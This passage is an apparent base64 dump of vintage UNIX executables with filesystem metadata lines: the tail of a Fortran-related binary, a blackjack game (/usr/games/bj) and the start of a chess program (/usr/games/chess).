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
8zUHADxJIAJ3CfD6phDCFVNUdwmO9ewqFgGXogoAEwKADACcTywmEMBF8P8zXOIqPEmAFY
AMgAyADIAMwEXw/zMc4io+SYIVhQABBAIEAggECAQQdGFuaABzcXJ0AHNuZ2wAc2luAHNp
Z24AcmVhbABtb2QAbWluMQBtaW4wAG1heDEAbWF4MABpc2lnbgBpbnQAaWZpeABpZGludA
BpZGltAGlhYnMAZmxvYXQAZXhwAGRzcXJ0AGRzaW4AZHNpZ24AZHJlYWwAZG1vZABkbWlu
MQBkbWF4MQBkbG9nMTAAZGxvZwBkaW1hZwBkaW0AZGV4cABkY3NxcnQAZGNzaW4AZGNvcw
BkY29uamcAZGNtcGx4AGRjbG9nAGRjZXhwAGRjY29zAGRjYWJzAGRibGUAZGF0YW4yAGRh
dGFuAGRhYnMAY3NxcnQAY3NpbgBjb3MAY29uamcAY21wbHgAY2xvZwBjZXhwAGNjb3MAY2
FicwBhdGFuMgBhdGFuAGFtb2QAYW1pbjEAYW1pbjAAYW1heDEAYW1heDAAYWxvZzEwAGFs
b2cAYWludABhaW1hZwBhYnMAACIiQiIiYgAgACAAACAgQAAAAiJERESERERERESEIkSIiE
SISIiIiIQkREREZmYiZiZmZmZiIiIiIgIiAiIiImIiwBw8ScBFx/8XIBAABQN3CcbzEQAA
CoUAZhEmEeYQphAECsIcPkmmFMUVAQB3CcL8GwEKIAIGwAoEBHcJmvMTAAAKZhFAcURhhR
VScXcJGPUXICQABgLOCukGdwl68xIA5QEXICIABAN3CWzzFAAACpclAQADA3cJXvMSAIIV
gxXFnD1JRHFAEYQVhRWFAGYRJhHDNQEAEwLBNQEAEALXIAIABAL3FQIu0gkMAcUQoQAFDH
cRyAn3FewtwAkDAfcV2C24CfcJBgCEFYUVhwBFEAULhWABBocABAoDc4QMA3FEEURgZhCm
EEQgBoZAEPcJrvICBsFg+AGEIAuDwuCAEPcJnPL5BP8JcglEIO0ChBDrAUQgBAP/CWIJRB
DtAYIVJhEBEcFggBBA4ITtAgAEIAaHgBWEFWYQphACEAER9wmM/4IVgRXDAWYQphDFEECS
kZISkER/ghWBFYcAZhCmEMUdGglAEpESEhBEf4IVgRWHAEASiRIKEIcAZhBBFTcQSggAiV
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
P3NYAAUiECAjcKSiHFZQgA9wkY/8XlCACHAPcJLPz3CzQhuAP37TghKiH3CQABZhHAFVpW
ARIQCgISEAoDEhAKBBIQCsUVWlbmFQABwBVmVgEkCQUYBgIkBocVggMkA4cSggQkEILAFW
ZWAeQmCgLkTgsmCgPkTgsE5IMLTguC5U4LgeWNU8QMQwxCDEEMoQAODNwCzhUAgMVlAgBX
IWJW1YfWC4UVdwBe/vcJnPv3ba4goCD3Cpwg9wlyAGYRxRVqVvc1gACaIAIDxWUEAAAKAQ
oCCgMKBArADAICgArlCxcgAAELAlchZlYIgsAVWlZQEJAQ0BAQEYUVhwChAAEMAgwDDAQM
DTDnAyYQwBVaVgFkJgoCZE4LJgoDZE4LBGRDC04LgmVOC4FlgBXVAfctGCAiIAQD9xX//w
4ghwD3FQEABiCHAAAAAQAEAAWJAAAAAHcTFAB3FQQAdwm+9wAAAYaFACYQdwmy9wAAwACA
VYUAA4kAAAACCIkAALYBdxMKAHcVEAAmEHcJ8PcAAIAVwAB3Ceb3AACFAASJAAAAANAv3i
/uL/4v/i/+L/4v/i/+L+Yv9i/+L2YzbjP+Lx4yQDI6MjAy/i/+L6w0sjR2M/QxfDNCMgwy
KDVUM9gymDJAM6oygDKuMNgw4jACMQ4xHjEuMT4xAQA=
-- /usr/games mode=0140775 uid=3 gid=3 atime=174843151 mtime=170481778 --
-- /usr/games/bj mode=0100775 uid=3 gid=3 atime=170481277 mtime=169259068 base64=1 --
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
-- /usr/games/chess mode=0110775 uid=3 gid=3 atime=174890145 mtime=169259069 base64=1 --
CAHAOwgDzhMAAAAAAAABAAnwgBEmEtALNhACAPcJuBGWJQAKAYl3CUQ7xuUGAPUd+kP4//
c1CACQQCQD9wuKRCEC9wuGRB4C1y2CRAQAGgLOFQQA3wmsBMALFAPOFQUA3wmsBMALDgPO
FQYA3wmsBMALCAPOFQIAJgrmFQQA3wkqAZYl9zUQAEBAJwPXLTBEBAAjAvcLKkQgAvcLJk
QdAvcLIkQaAs4VAgDfCawEwAsUA84VAwDfCawEwAsOA84VBADfCawEwAsIA84V/v8mCuYV
BADfCSoBliX3CUQFdR34//b/IQF1H/b/9P/1ZQIA9v9OH/b/3wl4Cs4d0D/fCawEwAsMA3
0d9P/4//VlAgD4/30f9v/4//VlAgD4//VlAgD2//cJsgp3Lfb//kLbAncd+P/2QncAQjp3
CTA6QB0EAMAMcD0GADBECQJOHQQATm0IAGYdBADfCVIB1gt3ABo6dwkIOkAdBgDADPALsE
QEB8AVAQB3AAI6QB0GAMAMABywRMAMABykQMDtqkI/EJpC92UCAJRCQB0EABd0CABAXQYA
PxCEQvdlAgB+QkAdBgDADPALsETcAgAK3AF3Caw5xuUGAPUdYkL4//c1AQD4PiQD9wtiQy
EC9wteQx4C1y1aQ/z/GgLOFTwA3wlGA8ALFAPOFT0A3wlGA8ALDgPOFT4A3wlGA8ALCAPO
FQIAJgrmFTwA3wnCApYl9zUCAKg+JwPXLQhD/P8jAvcLAkMgAvcL/kIdAvcL+kIaAs4VOg
DfCUYDwAsUA84VOwDfCUYDwAsOA84VPADfCUYDwAsIA84V/v8mCuYVPADfCcICliX3Cdgr
dR34//b/IQF1H/b/9P/1ZQIA9v9OH/b/3wmYM84dOj7fCUYDwAsMA30d9P/4//VlAgD4/3
0f9v/4//VlAgD4//VlAgD2//cJPDJ3Lfb/ZkHbAncd+P9eQXcAqjh3CZg4QB0EAMAMcD0G
ADBECQJOHQQATm0IAGYdBADfCeoC1gt3AII4dwlwOEAdBgDADPALsEQEBMAVAQB3AGo4wB
0iQUEdBgDBDEEcsETBDEDspEA/EAJB92UCAPxAQB0EABd0CABAXQYAPxDsQPdlAgDmQEAd
BgDADPALsETcAgAK3AGAHQIAwAwBHDBEwhUCAME1BAwDAgIskkRaA8E1BggDAgIspERUA8
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
8AC9QBdwnwMPcJLCgAC3cA9DDEHaI5g50CAIKdAwDUHaA51B0uNtQdLDaUENQQwgzDDMAc
sEQUEAQDwAw37KRAgDmAHLBEMxCwRDIKsET3Ff//AjbADAgHeADACtAKwAvACzgLtAtSCw
MAwuABBAILlyACAAoCMwqwRPMVAQDARNQVBAA3ETA5hwCXICAABwKCnQMAwmUIALcQujVe
AdcgUABbBfdlGQAYOdcgYABVBfdlMgAMOdcgcABPBfdlcQIAOfMVBQCwRNQVBQA3Eeg4hw
CXIA4ABAL3RQgAdjU9AcILOwL3RRAAajU3AYMM9xBmNfdFGABcNZcgCAAeAtcgBgAMArcK
ujj3FQQARjk3CkY51BUCADcRnjiHANcgAgAMArcKnDj3FQQAJDk3Cho51BUDADcRgDiHAP
cLdDgDAvflAgB8OBQKNxFsOIcA9wtgOAMC9wpqOAAB1BUBADcRVjiHAMQdUDgAGQEZAxkC
GTcZ4jQ3Gdw0NxlGODcRODjCDMMM8hywRLBEcxCwRMAMeAD6CwYMDAwODCAMMgw+DIIMtx
CyNIcA9xUEAKo4NwqiOPcVBACgNIcA9xUEAIo4NwqMOPcVBACONIcA8hUBALBEMwrARIcA
8hUBALBEhwB3CRQvxuUGAPcLvDcDAgAKdwASLw4K5h2uN+YdqDffCfw6liU1Cvj/BgH1C/
